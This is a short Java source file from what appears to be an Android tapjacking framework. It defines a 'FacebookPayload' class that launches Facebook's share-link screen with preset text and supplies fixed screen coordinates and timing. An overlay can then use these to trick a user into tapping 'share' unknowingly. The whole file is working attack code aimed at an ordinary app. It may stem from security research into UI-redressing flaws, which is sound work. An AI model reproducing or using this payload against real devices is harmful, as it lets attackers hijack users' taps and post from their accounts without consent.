package com.tapjacking.payloads;

import com.tapjacking.framework.FrameworkPayload;
import android.content.Intent;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Point;
import android.net.Uri;

public class FacebookPayload extends FrameworkPayload {

	public FacebookPayload() {
		for(int i=0; i<=6; i++)
			positions.add(new Point(350, 610));
	}

	public Intent getIntent() {
		Intent shareIntent = new Intent(android.content.Intent.ACTION_SEND);
		shareIntent.setType("text/plain");
		final ComponentName name = new ComponentName("com.facebook.katana", "com.facebook.katana.ShareLinkActivity");
		shareIntent.putExtra(android.content.Intent.EXTRA_TEXT, "Content to share");
		shareIntent.addCategory(Intent.CATEGORY_LAUNCHER);
		shareIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
		shareIntent.setComponent(name);
		return shareIntent;
	}

	public int getSleep() {
		return 1000;
	}

}
